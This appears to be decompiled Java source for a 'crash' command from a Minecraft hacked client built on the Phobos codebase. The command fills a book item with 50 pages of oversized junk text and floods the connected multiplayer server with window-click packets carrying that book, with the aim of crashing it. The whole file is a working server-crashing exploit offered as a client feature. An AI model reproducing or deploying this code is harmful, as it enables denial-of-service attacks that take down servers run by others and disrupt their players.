/*    */ package me.earth.phobos.features.command.commands;
/*    */ 
/*    */ import me.earth.phobos.features.command.Command;
/*    */ import me.earth.phobos.util.Util;
/*    */ import net.minecraft.client.Minecraft;
/*    */ import net.minecraft.init.Items;
/*    */ import net.minecraft.inventory.ClickType;
/*    */ import net.minecraft.item.ItemStack;
/*    */ import net.minecraft.nbt.NBTBase;
/*    */ import net.minecraft.nbt.NBTTagCompound;
/*    */ import net.minecraft.nbt.NBTTagList;
/*    */ import net.minecraft.nbt.NBTTagString;
/*    */ import net.minecraft.network.Packet;
/*    */ import net.minecraft.network.play.client.CPacketClickWindow;
/*    */ 
/*    */ public class CrashCommand
/*    */   extends Command {
/*    */   int packets;
/*    */   
/*    */   public CrashCommand() {
/* 21 */     super("crash", new String[] { "crash" });
/*    */   }
/*    */ 
/*    */   
/*    */   public void execute(final String[] commands) {
/* 26 */     (new Thread("crash time trololol")
/*    */       {
/*    */         
/*    */         public void run()
/*    */         {
/* 31 */           if (Minecraft.func_71410_x().func_147104_D() == null || (Minecraft.func_71410_x().func_147104_D()).field_78845_b.isEmpty()) {
/* 32 */             Command.sendMessage("Join a server monkey");
/*    */             return;
/*    */           } 
/* 35 */           if (commands[0] == null) {
/* 36 */             Command.sendMessage("Put the number of packets to send as an argument to this command. (20 should be good)");
/*    */             return;
/*    */           } 
/*    */           try {
/* 40 */             CrashCommand.this.packets = Integer.parseInt(commands[0]);
/* 41 */           } catch (NumberFormatException e) {
/* 42 */             Command.sendMessage("Are you sure you put a number?");
/*    */             return;
/*    */           } 
/* 45 */           ItemStack bookObj = new ItemStack(Items.field_151099_bA);
/* 46 */           NBTTagList list = new NBTTagList();
/* 47 */           NBTTagCompound tag = new NBTTagCompound();
/* 48 */           int pages = Math.min(50, 100);
/* 49 */           String size = "wveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5"; int i;
/* 50 */           for (i = 0; i < pages; i++) {
/* 51 */             String siteContent = size;
/* 52 */             NBTTagString tString = new NBTTagString(siteContent);
/* 53 */             list.func_74742_a((NBTBase)tString);
/*    */           } 
/* 55 */           tag.func_74778_a("author", Util.mc.field_71439_g.func_70005_c_());
/* 56 */           tag.func_74778_a("title", "phobos > all :^D");
/* 57 */           tag.func_74782_a("pages", (NBTBase)list);
/* 58 */           bookObj.func_77983_a("pages", (NBTBase)list);
/* 59 */           bookObj.func_77982_d(tag);
/* 60 */           for (i = 0; i < CrashCommand.this.packets; i++) {
/* 61 */             Util.mc.field_71442_b.field_78774_b.func_147297_a((Packet)new CPacketClickWindow(0, 0, 0, ClickType.PICKUP, bookObj, (short)0));
/*    */           }
/*    */         }
/* 64 */       }).start();
/*    */   }
/*    */ }


/* Location:              C:\Users\taruv\Documents\Client\Catware_1.0_Official_Release_UwU.jar!\me\earth\phobos\features\command\commands\CrashCommand.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */